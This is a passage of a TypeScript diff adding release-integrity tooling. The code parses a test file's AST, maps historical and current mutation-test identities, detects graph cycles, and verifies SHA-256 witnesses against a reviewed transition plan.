+  const sourceObservation = observeReleaseMutationTransitionSources(
+    matrixSource,
+    manifestSource,
+    plan.retiredSourceIds,
+    plan.newSources,
+    plan.currentMcpbInputs
+  );
+  problems.push(...sourceObservation.problems);
+  if (manifest === null) {
+    return Object.freeze({
+      current: null,
+      declarativeCount: matrixObservation.declarative.length,
+      historical: null,
+      legacyCount: matrixObservation.legacy.length,
+      matrixSliceSha256: matrixObservation.matrixSliceSha256,
+      problems: Object.freeze(problems),
+      sourceSha256: matrixObservation.sourceSha256
+    });
+  }
+
+  const historicalCaseByRoot = new Map(manifest.cases.map((identityCase) => [identityCase.root, identityCase]));
+  const historicalIdentities = manifest.mutations.flatMap((mutation) => {
+    const ownerCase = historicalCaseByRoot.get(mutation.ownerRoot);
+    if (ownerCase === undefined) {
+      problems.push(`historical mutation ${mutation.id} has no owner case`);
+      return [];
+    }
+    return [transitionIdentityProjection(mutation, ownerCase)];
+  });
+  const historical: ReleaseMutationTransitionPopulation = {
+    schemaVersion: 2,
+    fixtureSha256: historicalFixtureSha256,
+    sources: manifest.sources.map((source) => transitionSourceProjection(source)),
+    identities: historicalIdentities
+  };
+
+  const declarativeIds = new Set(matrixObservation.declarative.map((entry) => entry.id));
+  if (matrixObservation.declarative.length !== 94 || declarativeIds.size !== 94) {
+    problems.push(
+      `current declarative projection must contain 94 unique identities; found ` +
+        `${matrixObservation.declarative.length}/${declarativeIds.size}`
+    );
+  }
+  const successorByOld = new Map(plan.successors.map((entry) => [entry.oldId, entry]));
+  const newIdentitiesByAnchor = new Map<string, ReleaseMutationTransitionObservationPlan["newIdentities"]>();
+  for (const entry of plan.newIdentities) {
+    newIdentitiesByAnchor.set(entry.afterOldId, [...(newIdentitiesByAnchor.get(entry.afterOldId) ?? []), entry]);
+  }
+  const lexicalOld = [...manifest.mutations]
+    .sort((left, right) => left.legacyOrder - right.legacyOrder)
+    .filter((mutation) => !declarativeIds.has(mutation.id));
+  const assignments: Array<{
+    readonly id: string;
+    readonly kind: "new" | "old" | "successor";
+    readonly oldId: null | string;
+  }> = [];
+  for (const mutation of lexicalOld) {
+    const successor = successorByOld.get(mutation.id);
+    assignments.push({
+      id: successor?.newId ?? mutation.id,
+      oldId: mutation.id,
+      kind: successor === undefined ? "old" : "successor"
+    });
+    for (const entry of newIdentitiesByAnchor.get(mutation.id) ?? []) {
+      assignments.push({ id: entry.id, oldId: null, kind: "new" });
+    }
+  }
+  const expectedLegacyCount = lexicalOld.length + plan.newIdentities.length;
+  if (
+    expectedLegacyCount !== plan.expectedLegacyCount ||
+    assignments.length !== plan.expectedLegacyCount ||
+    matrixObservation.legacy.length !== assignments.length
+  ) {
+    problems.push(
+      `current legacy projection must contain ${plan.expectedLegacyCount} classified calls; found ` +
+        `${matrixObservation.legacy.length}/${assignments.length}`
+    );
+  }
+
+  const currentLegacyByOldId = new Map<string, LegacyMutationCall>();
+  if (projectionMatrix !== null) {
+    for (const [index, assignment] of assignments.entries()) {
+      const call = projectionMatrix.calls[index];
+      if (assignment.oldId !== null && call !== undefined) currentLegacyByOldId.set(assignment.oldId, call);
+    }
+  }
+  const legacyCaseAnchors =
+    projectionMatrix === null
+      ? new Map<string, LegacyCaseExecutionAnchor>()
+      : validateTransitionUnchangedLegacyMatchers(
+          manifest,
+          projectionMatrix,
+          currentLegacyByOldId,
+          new Set(plan.unchangedOldIds),
+          problems
+        );
+  const transitionCaseNodes =
+    projectionMatrix === null ? new Map<string, readonly ts.Node[]>() : transitionCaseNodesBySha(projectionMatrix);
+  const transitionBindingGraph = projectionMatrix === null ? null : variableBindingFlows(projectionMatrix.sourceFile);
+
+  const idByCallIndex = new Map(assignments.map((assignment, index) => [index, assignment.id]));
+  const assignmentById = new Map(assignments.map((assignment) => [assignment.id, assignment]));
+  const childByParentArgument = new Map<string, number>();
+  const callIndexByAssignedName = new Map<string, number>();
+  for (const call of matrixObservation.legacy) {
+    if (call.assignedName !== null) callIndexByAssignedName.set(call.assignedName, call.index);
+    if (call.parentIndex !== null && call.parentArgument !== null) {
+      childByParentArgument.set(`${call.parentIndex}:${call.parentArgument}`, call.index);
+    }
+  }
+  const parentIndexByChild = new Map<number, number>();
+  for (const call of matrixObservation.legacy) {
+    if (call.parentIndex !== null) parentIndexByChild.set(call.index, call.parentIndex);
+  }
+  for (const call of matrixObservation.legacy) {
+    for (const expression of [call.sourceExpression, call.replacementExpression]) {
+      const child = callIndexByAssignedName.get(expression);
+      if (child === undefined) continue;
+      const existingParent = parentIndexByChild.get(child);
+      if (existingParent !== undefined && existingParent !== call.index) {
+        problems.push(`current mutation call ${child + 1} has more than one exact parent`);
+      } else {
+        parentIndexByChild.set(child, call.index);
+      }
+    }
+  }
+  const retiredSourceIds = new Set(plan.retiredSourceIds);
+  const sourceIdByExpression = new Map<string, string>();
+  for (const source of manifest.sources) {
+    if (retiredSourceIds.has(source.id)) continue;
+    for (const expression of source.legacyExpressions) sourceIdByExpression.set(expression, source.id);
+  }
+  for (const source of plan.newSources) sourceIdByExpression.set(source.legacyExpression, source.id);
+  const ownerRootId = (index: number): string | undefined => {
+    let currentIndex = index;
+    const visited = new Set<number>();
+    while (true) {
+      if (visited.has(currentIndex)) {
+        problems.push(`current mutation graph contains a parent cycle at call ${index + 1}`);
+        return undefined;
+      }
+      visited.add(currentIndex);
+      const parent = parentIndexByChild.get(currentIndex);
+      if (parent === undefined) return idByCallIndex.get(currentIndex);
+      currentIndex = parent;
+    }
+  };
+  const currentLegacyCallById = new Map(
+    assignments.flatMap((assignment, index) => {
+      const call = projectionMatrix?.calls[index];
+      return call === undefined ? [] : [[assignment.id, call] as const];
+    })
+  );
+  const exactPlannedLegacyCase = (targetId: string, ownerId: string, caseNodeSha256: string): boolean => {
+    if (projectionMatrix === null || transitionBindingGraph === null) return false;
+    const rootCall = currentLegacyCallById.get(ownerId)?.node;
+    if (rootCall === undefined) return false;
+    const candidates = (transitionCaseNodes.get(caseNodeSha256) ?? []).filter((node) =>
+      transitionMatcherCalls(node).some((matcher) =>
+        rootBoundToCurrentMatcher(rootCall, matcher, projectionMatrix.sourceFile, transitionBindingGraph)
+      )
+    );
+    if (candidates.length !== 1) {
+      problems.push(
+        `current target ${targetId} case witness ${caseNodeSha256} must identify one exact root-bound case node; ` +
+          `found ${candidates.length}`
+      );
+      return false;
+    }
+    return true;
+  };
+  const targetIdentities: ReleaseMutationTransitionProjection[] = [];
+  const targetSemanticsById = new Map<string, TransitionObservedMutationSemantics>();
+  const explicitWitnessById = new Map<
+    string,
+    Pick<MutationWitness, "after" | "anchor" | "before" | "derivation" | "kind">
+  >();
+  for (const [index, assignment] of assignments.entries()) {
+    const call = matrixObservation.legacy[index];
+    if (call === undefined) continue;
+    const sourceChild = childByParentArgument.get(`${index}:0`) ?? callIndexByAssignedName.get(call.sourceExpression);
+    const replacementChild =
+      childByParentArgument.get(`${index}:2`) ?? callIndexByAssignedName.get(call.replacementExpression);
+    const sourceId =
+      sourceChild === undefined ? sourceIdByExpression.get(call.sourceExpression) : idByCallIndex.get(sourceChild);
+    const replacementDependency = replacementChild === undefined ? null : (idByCallIndex.get(replacementChild) ?? null);
+    const rootId = ownerRootId(index);
+    if (sourceId === undefined || rootId === undefined || (assignment.kind !== "new" && call.needle === null)) {
+      problems.push(`current target ${assignment.id} has an unresolved logical projection`);
+      continue;
+    }
+    if (replacementDependency === null && assignment.kind !== "new" && call.replacement === null) {
+      problems.push(`current target ${assignment.id} has an unresolved literal replacement`);
+      continue;
+    }
+    let needle = call.needle;
+    let replacement = call.replacement;
+    let ownerCase: JsonValue;
+    if (assignment.kind === "new") {
+      const planEntry = plan.newIdentities.find((entry) => entry.id === assignment.id);
+      const templateCase = planEntry === undefined ? undefined : historicalCaseByRoot.get(planEntry.caseTemplateOldId);
+      if (planEntry === undefined || templateCase === undefined) {
+        problems.push(`missing new-root plan or case template for ${assignment.id}`);
+        continue;
+      }
+      if (projectionMatrix === null) {
+        problems.push(`current new identity ${assignment.id} cannot materialize its logical projection`);
+        continue;
+      }
+      const logicalValues = newIdentityLogicalValues(planEntry, call, projectionMatrix, problems);
+      if (logicalValues === null) continue;
+      needle = logicalValues.needle;
+      replacement = logicalValues.replacement;
+      ownerCase = transitionNewIdentityCaseProjection(
+        transitionCaseProjection(templateCase),
+        planEntry,
+        rootId,
+        problems
+      );
+      const observedRole: MutationRole = assignment.id === rootId ? "root" : "dependency";
+      const logicalProjectionSha256 = transitionLogicalProjectionSha256(
+        call.mode,
+        sourceId,
+        observedRole,
+        rootId,
+        needle,
+        replacementDependency ?? replacement,
+        call.expectedOccurrences
+      );
+      if (
+        call.mode !== planEntry.mode ||
+        logicalProjectionSha256 !== planEntry.logicalProjectionSha256 ||
+        call.nodeSha256 !== planEntry.nodeSha256 ||
+        observedRole !== planEntry.role ||
+        rootId !== planEntry.ownerId ||
+        sourceId !== planEntry.sourceId ||
+        call.expectedOccurrences !== planEntry.expectedOccurrences
+      ) {
+        problems.push(`current new identity ${assignment.id} disagrees with its reviewed logical projection`);
+      }
+      exactPlannedLegacyCase(assignment.id, rootId, planEntry.caseNodeSha256);
+    } else {
+      const oldMutation = manifest.mutations.find((mutation) => mutation.id === assignment.oldId);
+      const oldOwnerCase = oldMutation === undefined ? undefined : historicalCaseByRoot.get(oldMutation.ownerRoot);
+      const ownerAssignment = assignmentById.get(rootId);
+      if (oldMutation === undefined || oldOwnerCase === undefined || ownerAssignment === undefined) {
+        problems.push(`successor ${assignment.id} has no historical owner-case mapping`);
+        continue;
+      }
+      if (assignment.kind === "old" && !legacyCaseAnchors.has(oldOwnerCase.id)) {
+        problems.push(`current unchanged identity ${assignment.id} has no exact current owner-case proof`);
+      }
+      ownerCase = remapTransitionValue(
+        transitionCaseProjection(oldOwnerCase),
+        oldMutation.ownerRoot,
+        ownerAssignment.id
+      );
+    }
+    if (needle === null || (replacementDependency === null && replacement === null)) {
+      problems.push(`current target ${assignment.id} has no materialized logical projection`);
+      continue;
+    }
+    const observedRole: MutationRole = assignment.id === rootId ? "root" : "dependency";
+    const resolvedReplacement = replacementDependency ?? replacement;
+    targetSemanticsById.set(assignment.id, {
+      mode: call.mode,
+      source: { kind: sourceChild === undefined ? "source" : "mutation", id: sourceId },
+      replacementDependency,
+      needle,
+      replacement: resolvedReplacement,
+      expectedOccurrences: call.expectedOccurrences
+    });
+    if (assignment.kind === "successor") {
+      const successor = plan.successors.find((entry) => entry.newId === assignment.id);
+      const logicalProjectionSha256 = transitionLogicalProjectionSha256(
+        call.mode,
+        sourceId,
+        observedRole,
+        rootId,
+        needle,
+        resolvedReplacement,
+        call.expectedOccurrences
+      );
+      if (
+        successor === undefined ||
+        logicalProjectionSha256 !== successor.logicalProjectionSha256 ||
+        call.nodeSha256 !== successor.nodeSha256 ||
+        !exactPlannedLegacyCase(assignment.id, rootId, successor.caseNodeSha256)
+      ) {
+        problems.push(`current successor ${assignment.id} disagrees with its reviewed target witnesses`);
+        problems.push(
+          `current successor ${assignment.id} observed logical ${logicalProjectionSha256}, node ${call.nodeSha256}`
+        );
+      }
+    }
+    if (assignment.kind === "new") {
+      const newIdentityPlan = plan.newIdentities.find((entry) => entry.id === assignment.id);
+      const witnessBefore = newIdentityPlan?.witnessBefore ?? 1;
+      const witnessAfter = newIdentityPlan?.witnessAfter ?? witnessBefore - 1;
+      targetIdentities.push({
+        id: assignment.id,
+        mode: call.mode,
+        role: observedRole,
+        source: { kind: sourceChild === undefined ? "source" : "mutation", id: sourceId },
+        replacementDependency,
+        ownerRoot: rootId,
+        legacyOccurrence: 1,
+        expressions: {
+          source: { raw: call.sourceExpression, resolved: sourceId },
+          needle: { raw: call.needleExpression, resolved: needle },
+          replacement: {
+            raw: call.replacementExpression,
+            resolved: replacementDependency ?? replacement
+          },
+          expectedOccurrences: {
+            raw: call.expectedOccurrencesExpression,
+            resolved: call.expectedOccurrences
+          }
+        },
+        witness: {
+          kind: "token",
+          anchor: needle,
+          before: witnessBefore,
+          after: witnessAfter,
+          derivation: "needle"
+        },
+        ownerCase
+      });
+      continue;
+    }
+    const oldMutation = manifest.mutations.find((mutation) => mutation.id === assignment.oldId);
+    if (oldMutation === undefined) {
+      problems.push(`current old projection ${assignment.oldId ?? "<missing>"} is missing`);
+      continue;
+    }
+    targetIdentities.push(
+      transitionCurrentIdentityProjection(
+        oldMutation,
+        ownerCase,
+        {
+          mode: call.mode,
+          role: observedRole,
+          source: { kind: sourceChild === undefined ? "source" : "mutation", id: sourceId },
+          replacementDependency,
+          ownerRoot: rootId,
+          sourceExpression: call.sourceExpression,
+          needleExpression: call.needleExpression,
+          replacementExpression: call.replacementExpression,
+          expectedOccurrencesExpression: call.expectedOccurrencesExpression,
+          needle,
+          replacement: replacementDependency ?? replacement,
+          expectedOccurrences: call.expectedOccurrences,
+          witness: oldMutation.witness
+        },
+        assignment.id
+      )
+    );
+  }
+  const targetIdByOldId = new Map(
+    manifest.mutations.map((mutation) => [mutation.id, successorByOld.get(mutation.id)?.newId ?? mutation.id])
+  );
+  const sourceIdByDeclarativeHandle = new Map<string, string>();
+  for (const source of manifest.sources) {
+    if (!retiredSourceIds.has(source.id)) sourceIdByDeclarativeHandle.set(source.declarativeBinding, source.id);
+  }
+  for (const source of plan.newSources) sourceIdByDeclarativeHandle.set(source.binding, source.id);
+  const mutationIdByDeclarativeHandle = new Map<string, string>();
+  for (const mutation of declarativeProjection.mutations) {
+    mutationIdByDeclarativeHandle.set(
+      mutation.handle,
+      targetIdByOldId.get(mutation.id) ?? `<unclassified:${mutation.id}>`
+    );
+  }
+  const idByDeclarativeHandle = new Map([...sourceIdByDeclarativeHandle, ...mutationIdByDeclarativeHandle]);
+  const declarativeParents = new Map<string, string[]>();
+  for (const mutation of declarativeProjection.mutations) {
+    const parentId = targetIdByOldId.get(mutation.id) ?? mutation.id;
+    const dependencyHandles = [
+      mutationIdByDeclarativeHandle.has(mutation.sourceHandle) ? mutation.sourceHandle : null,
+      mutation.replacementHandle
+    ].filter((handle): handle is string => handle !== null);
+    for (const handle of dependencyHandles) {
+      const dependencyId = mutationIdByDeclarativeHandle.get(handle);
+      if (dependencyId === undefined) continue;
+      declarativeParents.set(dependencyId, [...(declarativeParents.get(dependencyId) ?? []), parentId]);
+    }
+  }
+  const declarativeOwnerRoot = (id: string): string | null => {
+    let current = id;
+    const visited = new Set<string>();
+    while (true) {
+      if (visited.has(current)) {
+        problems.push(`current declarative mutation graph contains a parent cycle at ${id}`);
+        return null;
+      }
+      visited.add(current);
+      const parents = [...new Set(declarativeParents.get(current) ?? [])];
+      if (parents.length === 0) return current;
+      if (parents.length !== 1 || parents[0] === undefined) {
+        problems.push(`current declarative identity ${id} must have at most one exact parent; found ${parents.length}`);
+        return null;
+      }
+      current = parents[0];
+    }
+  };
+  const declarativeCaseByHandle = new Map(
+    declarativeProjection.cases.map((identityCase) => [identityCase.handle, identityCase])
+  );
+  for (const observed of declarativeProjection.mutations) {
+    const historicalMutation = manifest.mutations.find((mutation) => mutation.id === observed.id);
+    const targetId = targetIdByOldId.get(observed.id);
+    const sourceMutationId = mutationIdByDeclarativeHandle.get(observed.sourceHandle);
+    const sourceId = sourceMutationId ?? sourceIdByDeclarativeHandle.get(observed.sourceHandle);
+    const replacementDependency =
+      observed.replacementHandle === null
+        ? null
+        : (mutationIdByDeclarativeHandle.get(observed.replacementHandle) ?? null);
+    const ownerRoot = targetId === undefined ? null : declarativeOwnerRoot(targetId);
+    const rootHandle =
+      ownerRoot === null ? undefined : [...mutationIdByDeclarativeHandle].find(([, id]) => id === ownerRoot)?.[0];
+    const observedCase = rootHandle === undefined ? undefined : declarativeCaseByHandle.get(rootHandle);
+    const historicalOwnerCase =
+      historicalMutation === undefined ? undefined : historicalCaseByRoot.get(historicalMutation.ownerRoot);
+    if (
+      historicalMutation === undefined ||
+      targetId === undefined ||
+      sourceId === undefined ||
+      ownerRoot === null ||
+      observedCase === undefined ||
+      historicalOwnerCase === undefined ||
+      (observed.replacement === null) === (replacementDependency === null)
+    ) {
+      problems.push(`current declarative identity ${observed.id} has an unresolved logical projection`);
+      continue;
+    }
+    const ownerCase = transitionDeclarativeOwnerCaseProjection(
+      observedCase,
+      historicalOwnerCase,
+      ownerRoot,
+      idByDeclarativeHandle,
+      problems
+    );
+    const observedRole: MutationRole = targetId === ownerRoot ? "root" : "dependency";
+    const resolvedReplacement = replacementDependency ?? observed.replacement;
+    if (resolvedReplacement === null) {
+      problems.push(`current declarative identity ${observed.id} has no exact replacement value`);
+      continue;
+    }
+    targetSemanticsById.set(targetId, {
+      mode: observed.mode,
+      source: {
+        kind: sourceMutationId === undefined ? "source" : "mutation",
+        id: sourceId
+      },
+      replacementDependency,
+      needle: observed.needle,
+      replacement: resolvedReplacement,
+      expectedOccurrences: observed.expectedOccurrences
+    });
+    explicitWitnessById.set(targetId, observed.witness);
+    const successor = successorByOld.get(observed.id);
+    if (successor !== undefined) {
+      const logicalProjectionSha256 = transitionLogicalProjectionSha256(
+        observed.mode,
+        sourceId,
+        observedRole,
+        ownerRoot,
+        observed.needle,
+        resolvedReplacement,
+        observed.expectedOccurrences
+      );
+      if (
+        logicalProjectionSha256 !== successor.logicalProjectionSha256 ||
+        observed.nodeSha256 !== successor.nodeSha256 ||
+        observedCase.caseNodeSha256 !== successor.caseNodeSha256
+      ) {
+        problems.push(`current successor ${targetId} disagrees with its reviewed target witnesses`);
+        problems.push(
+          `current successor ${targetId} observed logical ${logicalProjectionSha256}, ` +
+            `node ${observed.nodeSha256}, case ${observedCase.caseNodeSha256}`
+        );
+      }
+    }
+    targetIdentities.push(
+      transitionCurrentIdentityProjection(
+        historicalMutation,
+        ownerCase,
+        {
+          mode: observed.mode,
+          role: observedRole,
+          source: {
+            kind: sourceMutationId === undefined ? "source" : "mutation",
+            id: sourceId
+          },
+          replacementDependency,
+          ownerRoot,
+          sourceExpression: historicalMutation.expressions.source.raw,
+          needleExpression: historicalMutation.expressions.needle.raw,
+          replacementExpression: historicalMutation.expressions.replacement.raw,
+          expectedOccurrencesExpression: historicalMutation.expressions.expectedOccurrences.raw,
+          needle: observed.needle,
+          replacement: resolvedReplacement,
+          expectedOccurrences: observed.expectedOccurrences,
+          witness: observed.witness
+        },
+        targetId
+      )
+    );
+  }
+  const currentMutationValues = new Map<string, string>();
+  const currentWitnessById = new Map<
+    string,
+    Pick<MutationWitness, "after" | "anchor" | "before" | "derivation" | "kind">
+  >();
+  const materializeCurrentMutation = (id: string, active = new Set<string>()): string | null => {
+    const known = currentMutationValues.get(id);
+    if (known !== undefined) return known;
+    if (active.has(id)) {
+      problems.push(`current transition mutation graph contains a materialization cycle at ${id}`);
+      return null;
+    }
+    const semantic = targetSemanticsById.get(id);
+    if (semantic === undefined) {
+      problems.push(`current transition mutation ${id} has no observed semantic projection`);
+      return null;
+    }
+    const nextActive = new Set(active);
+    nextActive.add(id);
+    const sourceValue =
+      semantic.source.kind === "source"
+        ? sourceObservation.values.get(semantic.source.id)
+        : materializeCurrentMutation(semantic.source.id, nextActive);
+    const replacementValue =
+      semantic.replacementDependency === null
+        ? semantic.replacement
+        : materializeCurrentMutation(semantic.replacementDependency, nextActive);
+    if (sourceValue === undefined || sourceValue === null || replacementValue === null) {
+      problems.push(`current transition mutation ${id} cannot materialize exact source/replacement bytes`);
+      return null;
+    }
+    const occurrences = mutationMatchCount(sourceValue, semantic.needle);
+    if (occurrences !== semantic.expectedOccurrences) {
+      problems.push(
+        `current transition mutation ${id} exact source has ${occurrences} needle occurrence(s), ` +
+          `expected ${semantic.expectedOccurrences}`
+      );
+      return null;
+    }
+    const mutant = applyMutation(sourceValue, semantic.needle, replacementValue, semantic.mode);
+    const witness = deriveTransitionWitness(sourceValue, mutant, semantic.needle, replacementValue);
+    if (witness === null) {
+      problems.push(`current transition mutation ${id} has no independently derived causal witness`);
+      return null;
+    }
+    const explicitWitness = explicitWitnessById.get(id);
+    if (
+      explicitWitness !== undefined &&
+      (explicitWitness.kind !== witness.kind ||
+        explicitWitness.anchor !== witness.anchor ||
+        explicitWitness.before !== witness.before ||
+        explicitWitness.after !== witness.after ||
+        explicitWitness.derivation !== witness.derivation)
+    ) {
+      problems.push(`current declarative identity ${id} witness disagrees with independently derived semantics`);
+    }
+    currentMutationValues.set(id, mutant);
+    currentWitnessById.set(id, witness);
+    return mutant;
+  };
+  for (const identity of targetIdentities) materializeCurrentMutation(identity.id);
+  const witnessedTargetIdentities = targetIdentities.map((identity) => ({
+    ...identity,
+    witness: currentWitnessById.get(identity.id) ?? identity.witness
+  }));
+  const targetById = new Map(witnessedTargetIdentities.map((identity) => [identity.id, identity]));
+  const currentIdentities: ReleaseMutationTransitionProjection[] = plan.unchangedOldIds.flatMap((id) => {
+    const identity = targetById.get(id);
+    if (identity === undefined) {
+      problems.push(`current unchanged projection ${id} is missing`);
+      return [];
+    }
+    return [identity];
+  });
+  for (const entry of [...plan.successors, ...plan.newIdentities]) {
+    const targetId = "newId" in entry ? entry.newId : entry.id;
+    const target = targetById.get(targetId);
+    if (target === undefined) problems.push(`current target projection ${targetId} is missing`);
+    else currentIdentities.push(target);
+  }
+  const expectedIdentityCount = plan.unchangedOldIds.length + plan.successors.length + plan.newIdentities.length;
+  if (expectedIdentityCount !== plan.expectedIdentityCount || currentIdentities.length !== plan.expectedIdentityCount) {
+    problems.push(
+      `current identity population must equal ${plan.expectedIdentityCount}; found ${currentIdentities.length}`
+    );
+  }
+  if (sourceObservation.sources.length !== plan.expectedSourceCount) {
+    problems.push(
+      `current source population must equal ${plan.expectedSourceCount}; found ${sourceObservation.sources.length}`
+    );
+  }
+  const current: ReleaseMutationTransitionPopulation = {
+    schemaVersion: 3,
+    sources: sourceObservation.sources,
+    identities: currentIdentities
+  };
+  return Object.freeze({
+    current,
+    declarativeCount: matrixObservation.declarative.length,
+    historical,
+    legacyCount: matrixObservation.legacy.length,
+    matrixSliceSha256: matrixObservation.matrixSliceSha256,
+    problems: Object.freeze(problems),
+    sourceSha256: matrixObservation.sourceSha256
+  });
+}
+
+/**
+ * Observes the current hybrid mutation descriptors without assigning positional identities.
+ *
+ * The versioned transition layer consumes this data-only scan, assigns reviewed old, successor and
+ * new IDs, and then compares logical projections. AST nodes and source offsets deliberately do not
+ * cross this boundary; the exact node-text digest remains available as a tamper witness.
+ *
+ * @param matrixSource - Complete current `tests/release-integrity.test.ts` source text.
+ * @returns Parse diagnostics plus ordered legacy and explicit declarative descriptor observations.
+ */
+export function observeReleaseMutationTransitionMatrix(matrixSource: string) {
+  const problems: string[] = [];
+  const matrix = scanMatrix(matrixSource, problems);
+  if (matrix === null) {
+    return Object.freeze({
+      problems: Object.freeze(problems),
+      legacy: Object.freeze([]),
+      declarative: Object.freeze([]),
+      matrixSliceSha256: null,
+      sourceSha256: sha256(matrixSource)
+    });
+  }
+  const declarative = scanHybridDeclarativeMatrix(matrix, problems);
+  const callIndexByNode = new Map(matrix.calls.map((call, index) => [call.node, index]));
+  const legacy = matrix.calls.map((call, index) => {
+    let parentIndex: number | null = null;
+    let parentArgument: 0 | 2 | null = null;
+    let ancestor: ts.Node | undefined = call.node.parent;
+    while (ancestor !== undefined) {
+      const candidateIndex = callIndexByNode.get(ancestor);
+      if (candidateIndex !== undefined) {
+        const parent = matrix.calls[candidateIndex];
+        if (parent !== undefined) {
+          const argumentIndex = parent.node.arguments.findIndex(
+            (argument) =>
+              call.node.getStart(matrix.sourceFile) >= argument.getStart(matrix.sourceFile) &&
+              call.node.end <= argument.end
+          );
+          if (argumentIndex === 0 || argumentIndex === 2) {
+            parentIndex = candidateIndex;
+            parentArgument = argumentIndex;
+          } else {
+            problems.push(`transition legacy call ${index + 1} is nested outside source or replacement position`);
+          }
+        }
+        break;
+      }
+      ancestor = ancestor.parent;
+    }
+    return Object.freeze({
+      index,
+      mode: call.mode,
+      assignedName: call.assignedName,
+      sourceExpression: call.sourceExpression,
+      needleExpression: call.needleExpression,
+      replacementExpression: call.replacementExpression,
+      expectedOccurrencesExpression: call.expectedOccurrencesExpression,
+      needle: resolveStaticString(call.node.arguments[1], matrix.declarations),
+      replacement: resolveStaticString(call.node.arguments[2], matrix.declarations),
+      expectedOccurrences: resolveStaticInteger(call.node.arguments[3], matrix.declarations) ?? 1,
+      parentIndex,
+      parentArgument,
+      nodeSha256: call.span.sha256
+    });
+  });
+  return Object.freeze({
+    problems: Object.freeze(problems),
+    matrixSliceSha256: sha256(matrix.matrixSlice),
+    sourceSha256: sha256(matrixSource),
+    legacy: Object.freeze(legacy),
+    declarative: Object.freeze(
+      declarative.mutations.map((mutation) =>
+        Object.freeze({
+          id: mutation.id,
+          handle: mutation.handle,
+          mode: mutation.mode,
+          nodeSha256: mutation.nodeSha256,
+          sourceHandle: mutation.sourceHandle,
+          needle: mutation.needle,
+          replacement: mutation.replacement,
+          replacementHandle: mutation.replacementHandle,
+          expectedOccurrences: mutation.expectedOccurrences,
+          witness: mutation.witness
+        })
+      )
+    )
+  });
+}
+
+function exactUtf8ReadPath(
+  expression: ts.Expression | undefined,
+  expectedPath: string,
+  sourceFile: ts.SourceFile
+): boolean {
+  if (
+    expression === undefined ||
+    !ts.isCallExpression(expression) ||
+    !ts.isIdentifier(expression.expression) ||
+    expression.expression.text !== "readFileSync" ||
+    expression.arguments.length !== 2
+  ) {
+    return false;
+  }
+  const url = expression.arguments[0];
+  const encoding = expression.arguments[1];
+  if (
+    url === undefined ||
+    !ts.isNewExpression(url) ||
+    !ts.isIdentifier(url.expression) ||
+    url.expression.text !== "URL" ||
+    url.arguments?.length !== 2 ||
+    encoding === undefined ||
+    !ts.isStringLiteral(encoding) ||
+    encoding.text !== "utf8"
+  ) {
+    return false;
+  }
+  const path = url.arguments[0];
+  const base = url.arguments[1];
+  return (
+    path !== undefined &&
+    ts.isStringLiteral(path) &&
+    path.text === `../${expectedPath}` &&
+    base !== undefined &&
+    base.getText(sourceFile) === "import.meta.url"
+  );
+}
+
+/**
+ * Materializes the exact current source catalogue used by schema-v3 transition witnesses.
+ *
+ * Retained file origins are validated against exact current UTF-8 reads. Retained constant and
+ * derived origins are reconstructed from their current AST declarations, so semantic initializer
+ * drift cannot hide behind a recomputed content digest. A retired source must be named explicitly,
+ * while current-only constant and file sources must provide their reviewed AST binding, origin and
+ * declarative identity.
+ *
+ * @param matrixSource - Complete current release-integrity source candidate.
+ * @param manifestSource - Immutable schema-v2 identity fixture bytes.
+ * @param retiredSourceIds - Historical source IDs intentionally absent from the current graph.
+ * @param newSources - Current-only constant/file source declarations and bindings.
+ * @returns Current source projections plus stable materialization diagnostics.
+ */
+export function observeReleaseMutationTransitionSources(
+  matrixSource: string,
+  manifestSource: string,
+  retiredSourceIds: readonly string[],
+  newSources: ReleaseMutationTransitionObservationPlan["newSources"],
+  currentMcpbInputs: ReleaseMutationTransitionObservationPlan["currentMcpbInputs"]
+) {
+  const problems: string[] = [];
+  const manifest = parseManifest(manifestSource, problems);
+  const matrix = scanMatrix(matrixSource, problems);
+  if (manifest === null || matrix === null) {
+    return Object.freeze({
+      problems: Object.freeze(problems),
+      sources: Object.freeze([]),
+      values: new Map<string, string>() as ReadonlyMap<string, string>
+    });
+  }
+  const retired = new Set(retiredSourceIds);
+  const materializationProblems: string[] = [];
+  const values = new Map(materializeSourceValues(manifest, matrix, materializationProblems));
+  for (const problem of materializationProblems) {
+    const contentDrift = /^manifest source .+ contentSha256 must identify exact materialized bytes [0-9a-f]{64}$/u.test(
+      problem
+    );
+    const retiredMissing = [...retired].some(
+      (id) => problem === `manifest source ${id} cannot be independently materialized from its declared origin`
+    );
+    if (!contentDrift && !retiredMissing) problems.push(problem);
+  }
+  const retainedSourceOrigin = (source: SourceIdentity): SourceOrigin | null => {
+    if (source.origin.kind === "constant") {
+      const declaration = source.legacyExpressions.find((expression) => !expression.includes("."));
+      const initializer = declaration === undefined ? undefined : matrix.declarations.get(declaration);
+      if (initializer === undefined) {
+        problems.push(`current retained constant source ${source.id} has no exact declaration`);
+        return null;
+      }
+      return Object.freeze({
+        kind: "constant" as const,
+        declarationExpression: initializer.getText(matrix.sourceFile)
+      });
+    }
+    if (source.origin.kind === "derived") {
+      const declaration = source.legacyExpressions.find((expression) => !expression.includes("."));
+      const initializer = declaration === undefined ? undefined : matrix.declarations.get(declaration);
+      if (initializer === undefined) {
+        problems.push(`current retained derived source ${source.id} has no exact declaration`);
+        return null;
+      }
+      return Object.freeze({
+        kind: "derived" as const,
+        definitionExpression: initializer.getText(matrix.sourceFile),
+        dependencies: source.origin.dependencies
+      });
+    }
+    const canonicalRead = `readFileSync(new URL("../${source.origin.path}", import.meta.url), "utf8")`;
+    const directDeclaration = source.legacyExpressions.find((expression) => !expression.includes("."));
+    const directInitializer = directDeclaration === undefined ? undefined : matrix.declarations.get(directDeclaration);
+    const directReadMatches = exactUtf8ReadPath(directInitializer, source.origin.path, matrix.sourceFile);
+    const inputReadMatches = currentMcpbInputs.some(
+      (entry) => entry.sourceId === source.id && entry.expression === canonicalRead
+    );
+    if (!directReadMatches && !inputReadMatches) {
+      problems.push(`current retained file source ${source.id} has no exact read origin ${source.origin.path}`);
+      return null;
+    }
+    return source.origin;
+  };
+  const currentValues = new Map<string, string>();
+  const sources = manifest.sources.flatMap((source) => {
+    if (retired.has(source.id)) return [];
+    const value = values.get(source.id);
+    const origin = retainedSourceOrigin(source);
+    if (value === undefined || origin === null) {
+      problems.push(`current retained source ${source.id} could not be materialized`);
+      return [];
+    }
+    currentValues.set(source.id, value);
+    return [
+      Object.freeze({
+        id: source.id,
+        legacyExpressions: source.legacyExpressions,
+        declarativeBinding: source.declarativeBinding,
+        origin,
+        contentSha256: sha256(value)
+      })
+    ];
+  });
